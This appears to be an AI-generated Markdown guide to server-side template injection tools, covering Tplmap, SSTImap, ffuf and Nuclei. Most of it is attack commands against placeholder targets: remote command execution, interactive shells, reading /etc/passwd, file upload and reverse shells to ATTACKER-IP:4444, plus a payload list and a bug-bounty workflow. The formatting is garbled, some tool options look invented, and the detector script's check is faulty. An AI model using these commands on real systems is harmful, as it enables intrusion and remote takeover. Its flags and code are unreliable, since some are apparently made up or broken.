# 🔥 SSTI (Server-Side Template Injection) Tools Collection

Complete guide for installing and using SSTI detection and exploitation tools.

---

## 📋 Table of Contents
- [Tplmap - Automated SSTI Scanner](#tplmap---automated-ssti-scanner)
- [SSTImap - Advanced SSTI Tool](#sstimap---advanced-ssti-tool)
- [tplmap Fork - Extended Version](#tplmap-fork---extended-version)
- [Manual Testing Payloads](#manual-testing-payloads)
- [Quick Reference](#quick-reference)

---

## 🚀 Tplmap - Automated SSTI Scanner

### Installation

```bash
# Clone the repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# For Python 3 (recommended)
pip3 install -r requirements.txt
```
# Install additional dependencies
pip install requests beautifulsoup4
Usage Examples
```
bash
# Basic detection
python tplmap.py -u "http://target.com/page?name=John"

# With POST data
python tplmap.py -u "http://target.com/page" -d "name=John"

# Detect with specific engine
python tplmap.py -u "http://target.com/page?name=John" --engine Jinja2

# OS Command execution
python tplmap.py -u "http://target.com/page?name=John" --os-cmd "id"

# Interactive OS shell
python tplmap.py -u "http://target.com/page?name=John" --os-shell

# Blind SSTI with DNS callback
python tplmap.py -u "http://target.com/page?name=John" --os-cmd "nslookup YOUR-COLLABORATOR.com"

# File read
python tplmap.py -u "http://target.com/page?name=John" --read-file /etc/passwd

# Reverse shell
python tplmap.py -u "http://target.com/page?name=John" --os-shell --reverse-shell ATTACKER-IP:4444

# With cookies
python tplmap.py -u "http://target.com/page?name=John" --cookie "session=abc123"

# With headers
python tplmap.py -u "http://target.com/page?name=John" --header "X-Forwarded-For: 127.0.0.1"

# Output to file
python tplmap.py -u "http://target.com/page?name=John" -o results.txt

# Verbose mode
python tplmap.py -u "http://target.com/page?name=John" -v

# Check multiple parameters
python tplmap.py -u "http://target.com/page" -d "name=John&email=test@test.com" --level 2
```
# Time-based blind detection
python tplmap.py -u "http://target.com/page?name=John" --time-based
🎯 SSTImap - Advanced SSTI Tool (Better than Tplmap)
Installation
bash
```
# Clone the repository
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap

# Install dependencies
pip install -r requirements.txt

# For Python 3
pip3 install -r requirements.txt

# Install additional packages
pip install colorama termcolor requests
Usage Examples
bash
# Basic detection
python sstimap.py -u "http://target.com/page?name=John"

# POST request
python sstimap.py -u "http://target.com/page" -d "name=John"

# Interactive shell (best feature)
python sstimap.py -u "http://target.com/page?name=John" --os-shell

# Execute single command
python sstimap.py -u "http://target.com/page?name=John" --os-cmd "id"

# File read
python sstimap.py -u "http://target.com/page?name=John" --read-file /etc/passwd

# Upload file
python sstimap.py -u "http://target.com/page?name=John" --upload-file local.txt --remote-path /tmp/remote.txt

# With cookies
python sstimap.py -u "http://target.com/page?name=John" --cookie "session=abc123"

# Multiple parameters
python sstimap.py -u "http://target.com/page?name=John&email=test" --level 2

# Blind SSTI
python sstimap.py -u "http://target.com/page?name=John" --blind --host YOUR-SERVER

# Reverse shell
python sstimap.py -u "http://target.com/page?name=John" --os-shell --reverse-shell ATTACKER-IP:4444

# All engines
python sstimap.py -u "http://target.com/page?name=John" --engine all

# Specific engine
python sstimap.py -u "http://target.com/page?name=John" --engine Jinja2

# Time-based detection
python sstimap.py -u "http://target.com/page?name=John" --time-based

# Output to JSON
python sstimap.py -u "http://target.com/page?name=John" -o output.json --json

# Verbose
python sstimap.py -u "http://target.com/page?name=John" -v 2
🔧 Tplmap Fork - Extended Version (More Payloads)
Installation
```
```
bash
# Clone the extended version
git clone https://github.com/SimpsonPT/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Install additional modules
pip install httpx beautifulsoup4 Jinja2
Usage Examples
bash
# Scan with extended payloads
python tplmap.py -u "http://target.com/page?name=John" --extended

# Auto-bypass WAF
python tplmap.py -u "http://target.com/page?name=John" --bypass

# Custom payload file
python tplmap.py -u "http://target.com/page?name=John" --payload-file custom.txt

# Scan all parameters
python tplmap.py -u "http://target.com/page" -d "name=John&email=test" --scan-all

# Force TLS
python tplmap.py -u "http://target.com/page?name=John" --force-ssl
# Proxy support
python tplmap.py -u "http://target.com/page?name=John" --proxy http://127.0.0.1:8080
```
🛠️ Manual Testing with Burp Suite
Burp Intruder Payloads
Save as ssti-payloads.txt:
```
{{7*7}}
${7*7}
${{7*7}}
#{7*7}
*{7*7}
@{7*7}
~{7*7}
{{config}}
{{self}}
${.vars}
{{_self.env}}
{$smarty.version}
<%= 7*7 %>
{{7*'7'}}
{7*7}
{{7*7}
${7*7}
```
Burp Intruder Setup
Send request to Intruder (Ctrl+I)

Set payload position on parameter value

Load payloads from ssti-payloads.txt

Start attack

Look for 49, config, or errors

🐍 Python Script for Quick Detection
Installation
bash
```
# No installation needed - just Python
pip install requests
Script: ssti_detector.py
```
python
```
#!/usr/bin/env python3
import requests
import sys
import time

def detect_ssti(url, param, payloads):
    print(f"[*] Testing SSTI on: {url}")
    print(f"[*] Parameter: {param}")
    print("="*50)
    
    for payload in payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            start = time.time()
            response = requests.get(test_url, timeout=10)
            end = time.time()
            
            if "49" in response.text or "7*7" not in response.text:
                print(f"[!] Possible SSTI: {payload}")
                print(f"    Response time: {end-start:.2f}s")
            
            if end-start > 4:
                print(f"[!] Time-based SSTI: {payload} (delay: {end-start:.2f}s)")
                
        except Exception as e:
            print(f"[-] Error: {e}")

# Basic payloads
payloads = [
    "{{7*7}}", "${7*7}", "${{7*7}}", "#{7*7}",
    "{{sleep(5)}}", "${sleep(5)}", "{{config}}",
    "{{self}}", "${.vars}", "{$smarty.now}"
]

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python ssti_detector.py <url> <parameter>")
        print("Example: python ssti_detector.py http://target.com/search q")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    detect_ssti(url, param, payloads)
Usage
```
bash
```
python ssti_detector.py "http://target.com/search" "q"
🔍 FFUF + SSTI Payloads
Installation
bash
```
# Install ffuf
go install github.com/ffuf/ffuf@latest
```
# Create payload file
```
cat > ssti_ffuf.txt << EOF
{{7*7}}
${7*7}
${{7*7}}
#{7*7}
{{sleep(5)}}
${sleep(5)}
{{config}}
{{self}}
EOF
```
Usage
bash
# Fuzz parameter
```
ffuf -u "http://target.com/page?FUZZ={{7*7}}" -w parameters.txt

# Fuzz payloads
ffuf -u "http://target.com/page?q=FUZZ" -w ssti_ffuf.txt -fs 0

# With delay detection
ffuf -u "http://target.com/page?q=FUZZ" -w ssti_ffuf.txt -t 1 -p 0.5
🚀 Nuclei SSTI Templates
Installation
bash
# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates
nuclei -update-templates
Usage
bash
# Run SSTI scans
nuclei -u http://target.com -tags ssti

# Specific template
nuclei -u http://target.com -t http/template-injection/

# With parameters
nuclei -u http://target.com/page?name=John -tags ssti -v

# All SSTI templates
nuclei -u http://target.com -t http/template-injection/ -s critical,high
```
# Rate limited
nuclei -u http://target.com -tags ssti -rl 10
📊 Quick Reference Guide
Tool	Best For	Command
Tplmap	Automated detection	python tplmap.py -u "URL?param=test"
SSTImap	Advanced exploitation	python sstimap.py -u "URL?param=test" --os-shell
FFUF	Parameter fuzzing	ffuf -u "URL?FUZZ={{7*7}}" -w params.txt
Nuclei	Mass scanning	nuclei -u URL -tags ssti
Manual	Bypass testing	Burp Intruder + payloads
🛡️ Docker Setup (Easiest)
bash
# Pull Tplmap Docker image
docker pull epinna/tplmap
```
# Run Tplmap
docker run -it epinna/tplmap -u "http://target.com/page?name=John"

# Run with output
docker run -it -v $(pwd):/output epinna/tplmap -u "http://target.com/page?name=John" -o /output/results.txt
📝 Example Workflow for Bug Bounty
bash
# 1. Find potential SSTI endpoints
gospider -s https://target.com | grep -E "(q=|search=|name=|page=|id=)"

# 2. Quick test with curl
curl "https://target.com/search?q={{7*7}}"

# 3. If "49" appears, run Tplmap
python tplmap.py -u "https://target.com/search?q=John" --os-cmd "id"

# 4. If blind, use collaborator
python tplmap.py -u "https://target.com/search?q=John" --os-cmd "nslookup YOUR-COLLAB.com"

# 5. Get reverse shell
python tplmap.py -u "https://target.com/search?q=John" --os-shell --reverse-shell ATTACKER-IP:4444
```
🎯 Success Criteria
Result	What it means
49 appears	✅ SSTI confirmed
Command output visible	✅ RCE achieved
DNS callback received	✅ Blind SSTI confirmed
5-second delay	✅ Time-based SSTI
File content visible	✅ File read possible
📚 Additional Resources
Tplmap GitHub

SSTImap GitHub

PayloadsAllTheThings - SSTI

PortSwigger SSTI Labs

⚠️ Disclaimer
Use these tools only on authorized targets for bug bounty programs or your own applications. Unauthorized testing is illegal.

🔧 Troubleshooting
Common Issues
bash
```
# Module not found
pip install -r requirements.txt --force-reinstall

# SSL errors
python tplmap.py -u "http://target.com" --force-ssl

# Timeout errors
python tplmap.py -u "http://target.com" --timeout 30

# Proxy issues
python tplmap.py -u "http://target.com" --proxy http://127.0.0.1:8080 --no-proxy
🎯 Happy Bug Hunting!
```
text

## 📁 **Save as:** `SSTI-TOOLS-GUIDE.md`

## 🚀 **Quick Copy-Paste Commands**

```bash
# Tplmap
git clone https://github.com/epinna/tplmap.git && cd tplmap && pip install -r requirements.txt

# SSTImap
git clone https://github.com/vladko312/SSTImap.git && cd SSTImap && pip install -r requirements.txt

# FFUF
go install github.com/ffuf/ffuf@latest

# Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
এখন আপনার README.md ফাইল প্রস্তুত! 🚀

